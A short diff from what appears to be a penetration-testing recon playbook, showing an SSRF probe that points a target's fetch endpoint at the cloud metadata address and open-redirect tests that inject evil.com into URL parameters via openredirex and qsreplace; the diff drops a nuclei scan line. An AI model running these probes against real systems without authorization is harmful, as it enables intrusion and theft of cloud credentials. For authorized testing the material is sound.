@@ -137,9 +137,6 @@ curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
 pip3 install openredirex
 openredirex -l runtime/engagements/${ENGAGEMENT_ID:-default-engagement}/recon/$TARGET/redirect-candidates.txt -p evil.com
 
-# nuclei
-nuclei -u https://$TARGET -t redirect/ -severity medium,high
-
 # gf + qsreplace
 cat runtime/engagements/${ENGAGEMENT_ID:-default-engagement}/recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
   xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
